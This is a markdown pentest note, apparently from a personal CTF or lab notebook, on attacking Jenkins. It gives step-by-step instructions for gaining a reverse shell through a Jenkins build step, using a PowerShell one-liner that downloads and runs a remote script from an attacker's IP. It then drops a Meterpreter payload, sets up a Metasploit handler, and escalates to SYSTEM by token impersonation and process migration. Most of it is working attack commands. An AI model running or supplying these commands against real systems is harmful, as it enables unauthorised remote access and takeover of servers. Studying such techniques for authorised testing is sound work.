---
title: Jenkins 👨‍🎓
---
![](Pasted%20image%2020240512182145.png)

## Gaining a reverse shell

1. Go to `Jenkins >> New Item`
2. Create a new `Freestyle project`
3. Go to `Build section` and select `Execute Windows batch command`:

![](Pasted%20image%2020240512180945.png)

4. Create in your local machine the `.ps1` reverse shell.
	- This shell is already in  [Reverse shells 👾](reverse_shells.md)
5. Initialize the python server for the script to download
6. now paste the following command in Jenkins:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PYTHON_PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port PYTHON_PORT
```

7. now go to `Build Now` int he build you created

==You will receive the shell pretty fast==

![](Pasted%20image%2020240512182102.png)

### Switch to a meterpreter

1. Generate a Windows meterpreter reverse shell using [Msfvenom 🕸️](/notes/Tools/msfvenom.md) (*check the command in the note*)
2. After creating the payload, download it into the machine with:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://YOUR_IP:PYTHON_PORT/SHELL.exe','SHELL.exe')"
```

3. Start Metasploit with `msfconsole -q`
4. Ensure the handler is set up in Metasploit:

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT your_port 
run
```

5. Execute the reverse shell in the victim's machine with:

```shell
Start-Process SHELL.exe
```

### Privilege Escalation with Token Impersonation

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

- User SIDs(security identifier)
- Group SIDs
- Privileges

Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:
- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:
- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

- View all the privileges using `whoami /priv`

Now, in Metasploit run:

```shell
load incognito
# run first "use incognito" if not installed
```

To check which tokens are available, enter:

```shell
list_tokens -g

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv
...
```

Impersonate the `BUILTIN\Administrators` token with:

```shell
 impersonate_token "BUILTIN\Administrators"
 # Confirm with
 getuid
```

Now migrate to a process with correct permissions with:

```shell
migrate PID_OF_PROCESS
```

Now you are `System32`

